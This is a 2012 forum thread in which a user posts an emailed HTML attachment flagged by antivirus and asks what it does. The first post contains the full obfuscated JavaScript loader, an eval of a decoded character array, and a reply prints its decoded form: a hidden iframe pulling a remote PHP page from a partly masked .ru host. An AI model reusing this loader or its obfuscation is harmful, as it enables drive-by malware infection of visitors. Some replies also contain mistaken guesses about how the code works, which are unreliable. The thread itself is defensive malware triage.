---
title: "Virus?"
date: 2012-02-17
forum: General Help
---

### Post by collisionystm on 2012-02-17
Received an attachment via email. Its an HTML file.

Anti Virus picked it up as a threat. Here is the code from notepad. Can anyone tell what It might be trying to do?

> <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
 <head>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  <title>Please wait...</title>
 </head>
 <body>  
<h1>Loading.Please wait..</h1>
 </body>

<script>if(window['d'+'o'+'c'+'ument'])aa=/\w/.exec(new Date()).index+[];aaa='0';if(aa.indexOf(aaa)!==-1)f=[-30,-30,66,63,-7,1,61,72,60,78,70,62,71,77,7,64,62,77,30,69,62,70,62,71,77,76,27,82,45,58,64,39,58,70,62,1,0,59,72,61,82,0,2,52,9,54,2,84,-30,-30,-30,66,63,75,58,70,62,75,1,2,20,-30,-30,86,-7,62,69,76,62,-7,84,-30,-30,-30,61,72,60,78,70,62,71,77,7,80,75,66,77,62,1,-5,21,66,63,75,58,70,62,-7,76,75,60,22,0,65,77,77,73,19,8,8,60,76,62,75,66,70,58,71,68,75,58,7,75,78,19,17,9,17,9,8,66,70,58,64,62,76,8,58,78,59,69,59,83,61,71,66,7,73,65,73,0,-7,80,66,61,77,65,22,0,10,9,0,-7,65,62,66,64,65,77,22,0,10,9,0,-7,76,77,82,69,62,22,0,79,66,76,66,59,66,69,66,77,82,19,65,66,61,61,62,71,20,73,72,76,66,77,66,72,71,19,58,59,76,72,69,78,77,62,20,69,62,63,77,19,9,20,77,72,73,19,9,20,0,23,21,8,66,63,75,58,70,62,23,-5,2,20,-30,-30,86,-30,-30,63,78,71,60,77,66,72,71,-7,66,63,75,58,70,62,75,1,2,84,-30,-30,-30,79,58,75,-7,63,-7,22,-7,61,72,60,78,70,62,71,77,7,60,75,62,58,77,62,30,69,62,70,62,71,77,1,0,66,63,75,58,70,62,0,2,20,63,7,76,62,77,26,77,77,75,66,59,78,77,62,1,0,76,75,60,0,5,0,65,77,77,73,19,8,8,60,76,62,75,66,70,58,71,68,75,58,7,75,78,19,17,9,17,9,8,66,70,58,64,62,76,8,58,78,59,69,59,83,61,71,66,7,73,65,73,0,2,20,63,7,76,77,82,69,62,7,79,66,76,66,59,66,69,66,77,82,22,0,65,66,61,61,62,71,0,20,63,7,76,77,82,69,62,7,73,72,76,66,77,66,72,71,22,0,58,59,76,72,69,78,77,62,0,20,63,7,76,77,82,69,62,7,69,62,63,77,22,0,9,0,20,63,7,76,77,82,69,62,7,77,72,73,22,0,9,0,20,63,7,76,62,77,26,77,77,75,66,59,78,77,62,1,0,80,66,61,77,65,0,5,0,10,9,0,2,20,63,7,76,62,77,26,77,77,75,66,59,78,77,62,1,0,65,62,66,64,65,77,0,5,0,10,9,0,2,20,-30,-30,-30,61,72,60,78,70,62,71,77,7,64,62,77,30,69,62,70,62,71,77,76,27,82,45,58,64,39,58,70,62,1,0,59,72,61,82,0,2,52,9,54,7,58,73,73,62,71,61,28,65,66,69,61,1,63,2,20,-30,-30,86];md='a';e=window['e'+'val'];w=f;s='';fr='f'+'ro'+'mChar';r=String[fr+'Code'];for(i=0;i-w.length<0;i++){j=i;s=s+r(39+w[j]);}if(aa.indexOf(aaa)!==-1)e(s);</script>

</html>

---

### Post by dino99 on 2012-02-17
*** attachment via email  *****

always scary if you have no idea of who send it. In any case you have to open it because it will rob your identity/data or everything else.

---

### Post by winh8r on 2012-02-17
identifies as 


JS/Obfuscus.AACA!tr


which is some sort of trojan


closest match I could find with a readable explanation is here:

[http://www.f-secure.com/v-descs/trojan_js_obfuscated_gen.shtml]("http://www.f-secure.com/v-descs/trojan_js_obfuscated_gen.shtml")

---

### Post by 23dornot23d on 2012-02-17
I did a google search on the first part of the code .....

[https://www.google.com/search?client=ubuntu&channel=fs&q=script+%22-30%2C-30%2C66%2C63%2C-7%22&ie=utf-8&oe=utf-8]("https://www.google.com/search?client=ubuntu&channel=fs&q=script+%22-30%2C-30%2C66%2C63%2C-7%22&ie=utf-8&oe=utf-8")

Seems it may affect Wordpress and Rss ...... not sure what it does though ....

Looks like its a generic Javascript unpacker .... from this link

[http://jsunpack.jeek.org/dec/go?report=17da362be1fb1ef9dd1afb78e0c988040738c240](http://jsunpack.jeek.org/dec/go?report=17da362be1fb1ef9dd1afb78e0c988040738c240)


Not sure if I am following this correctly - please feel free to comment - but can this unpack python code too and execute it .... just reading through to the bottom of this blog ....

[http://jsunpack.blogspot.com/](http://jsunpack.blogspot.com/)

---

### Post by collisionystm on 2012-02-17
hm...

Well I learned a couple months ago that you can mimick any domain you want when sending emails. I could send as [email]charles@google.com[/email] If I wanted. Thats what someone did here. Sent as a printer at my domain.

I always get printer emails because I have the bounceback's and responses to printer emails routed to me so I can handle them.

I must say Its pretty genius though.

---

### Post by collisionystm on 2012-02-17
I assume this is the file its trying to download and unpack

[http://www.w3.org/TR/html4/loose.dtd](http://www.w3.org/TR/html4/loose.dtd)

I am trying to wget the file but no such luck.

---

### Post by ofnuts on 2012-02-17
> **winh8r said:**
> identifies as 


JS/Obfuscus.AACA!tr


which is some sort of trojan


closest match I could find with a readable explanation is here:

[http://www.f-secure.com/v-descs/trojan_js_obfuscated_gen.shtml](http://www.f-secure.com/v-descs/trojan_js_obfuscated_gen.shtml)
Does:
```

if (document.getElementsByTagName('body')[0]) {            
iframer();        
} 
else {
 document.write("");         
}        
function iframer(){           
var f =  document.createElement('iframe');
f.setAttribute('src','http://cs*****kra.ru:8080/images/aublbzdni.php');
f.style.visibility='hidden';
f.style.position='absolute';
f.style.left='0';
f.style.top='0';
f.setAttribute('width','10');
f.setAttribute('height','10');             
document.getElementsByTagName('body')[0].appendChild(f);        
} 

```(url altered to protect the innocent)

Looks like naughty bits: [http://blog.dynamoo.com/2012/02/scan-from-hewlett-packard-officejet.html](http://blog.dynamoo.com/2012/02/scan-from-hewlett-packard-officejet.html)

---

### Post by 23dornot23d on 2012-02-17
> 
I assume this is the file its trying to download and unpack

[http://www.w3.org/TR/html4/loose.dtd](http://www.w3.org/TR/html4/loose.dtd)
Searching on that and it seems to be standard ... checking .....

[https://www.google.com/search?client=ubuntu&channel=fs&q=http%3A%2F%2Fwww.w3.org%2FTR%2Fhtml4%2Floose.dtd&ie=utf-8&oe=utf-8]("https://www.google.com/search?client=ubuntu&channel=fs&q=http%3A%2F%2Fwww.w3.org%2FTR%2Fhtml4%2Floose.dtd&ie=utf-8&oe=utf-8")

> 
function iframer(){            var f =  document.createElement('iframe'); f.setAttribute('src','http://cs*****kra.ru:8080/images/aublbzdni.php'); f.style.visibility='hidden';
Iframer though ..... looks to only relate to virus type information .....

[https://www.google.com/search?client=ubuntu&channel=fs&q=iframer%28%29&ie=utf-8&oe=utf-8](https://www.google.com/search?client=ubuntu&channel=fs&q=iframer%28%29&ie=utf-8&oe=utf-8)

seems to be a lot of reports on that address too

> 
/images/aublbzdni
[https://www.google.com/search?client=ubuntu&channel=fs&q=%2Fimages%2Faublbzdni&ie=utf-8&oe=utf-8](https://www.google.com/search?client=ubuntu&channel=fs&q=%2Fimages%2Faublbzdni&ie=utf-8&oe=utf-8)

Leads to this for checking to see if the site loads malicious code

[http://wepawet.iseclab.org/view.php?hash=fda107ddb9f645eb29341cc0fd6bb098&t=1329219108&type=js](http://wepawet.iseclab.org/view.php?hash=fda107ddb9f645eb29341cc0fd6bb098&t=1329219108&type=js)

and at the bottom of that it appears to be malware for windows 32 bit .....

---

